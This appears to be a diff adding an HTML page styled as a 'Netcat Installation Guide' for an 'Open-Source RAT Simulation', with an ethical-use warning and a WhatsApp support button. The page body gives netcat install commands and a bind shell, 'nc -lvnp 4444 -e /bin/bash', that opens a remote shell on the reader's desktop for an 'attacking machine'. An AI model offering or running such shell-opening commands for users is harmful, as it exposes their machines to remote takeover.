@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Netcat Installation Guide</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+:root{
+--primary:#0a1128;
+--secondary:#1a1f35;
+--accent:#00d9ff;
+--accent2:#ff2a6d;
+--light:#e0f7fa;
+--dark:#051129;
+--danger:#ff1744;
+--phish:#9c27b0;
+}
+
+body{
+background:linear-gradient(135deg,var(--dark),var(--primary));
+color:var(--light);
+font-family:'Exo 2',sans-serif;
+line-height:1.6;
+min-height:100vh;
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+overflow-x:hidden;
+padding:20px;
+}
+p{font-size:20px;color:orange;}
+.container{
+max-width:800px;
+width:100%;
+margin:0 auto;
+padding:20px;
+}
+
+header{
+text-align:center;
+padding:30px 0;
+margin-bottom:30px;
+}
+
+h1{
+font-family:'Orbitron',sans-serif;
+font-size:3rem;
+background:linear-gradient(to right,var(--accent),var(--phish));
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
+margin:15px 0;
+}
+
+.subtitle{
+font-size:1.2rem;
+color:var(--accent);
+margin-bottom:30px;
+}
+
+.warning{
+background:linear-gradient(45deg,#b71c1c,var(--danger));
+padding:20px;
+border-radius:10px;
+margin:20px auto;
+box-shadow:0 5px 25px rgba(255,23,68,0.3);
+text-align:center;
+}
+
+.warning h2{
+font-family:'Orbitron',sans-serif;
+margin-bottom:10px;
+}
+
+.installation{
+background:rgba(10,25,47,0.7);
+border-radius:15px;
+padding:30px;
+margin:30px 0;
+border:1px solid rgba(156,39,176,0.5);
+min-height:200px;
+}
+
+.support-btn{
+background:linear-gradient(45deg,#25d366,#128c7e);
+color:white;
+border:none;
+border-radius:50px;
+padding:18px 35px;
+font-size:1.2rem;
+font-weight:600;
+display:flex;
+align-items:center;
+gap:15px;
+cursor:pointer;
+margin-top:20px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<header>
+<h1>NETCAT INSTALLATION</h1>
+<div class="subtitle">Open-Source RAT Simulation </div>
+
+<div class="warning">
+<h2><i class="fas fa-exclamation-triangle"></i> ETHICAL USE WARNING</h2>
+<p>
+Netcat is designed for legitimate security awareness training.
+Use only on systems you own or have explicit permission to test.
+Unauthorized testing  are illegal and unethical.
+</p>
+</div>
+</header>
+
+<!-- EMPTY SECTION (PASTE YOUR CONTENT HERE) -->
+<section class="installation">
+  
+  
+  
+ <p>Hey, let's get you connected! 
+<br></br>
+Installing Netcat:
+You'll need to install Netcat on both your desktop and attacking machine. Here are the commands for popular Linux distributions:
+<br></br>
+- Ubuntu/Debian: sudo apt-get install netcat
+<br></br>
+- macOS (with Homebrew): brew install netcat
+<br></br>
+Setting up the listener (Desktop):
+Open a terminal on your desktop and run:
+<br></br>
+nc -lvnp 4444
+
+This sets up a listener on port 4444.
+
+Connecting from the attacking machine:
+Open a terminal on your attacking machine and run
+
+<br></br>
+nc <desktop-IP> 4444
+<br></br>
+Replace <desktop-IP> with your desktop's IP address.
+<br></br>
+Spawning a shell (optional):
+
+If you want to get a shell on your desktop, use the -e option:
+# On desktop
+<br></br>
+nc -lvnp 4444 -e /bin/bash
+<br></br>
+# On attacking machine
+<br></br>
+nc <desktop-IP> 4444
+<br></br><br></br>
+This will give you a shell on your desktop.
+
+Note: This is a basic example and not recommended for production use due to security concerns. Use secure methods like SSH or VPN for remote connections.</p>
+
+
+  
+  </section>
+
+<button class="support-btn" onclick="window.open('https://wa.me/+254798688920','_blank')">
+<i class="fab fa-whatsapp"></i>
+Get Support on WhatsApp
+</button>
+
+</div>
+
+</body>
+</html>
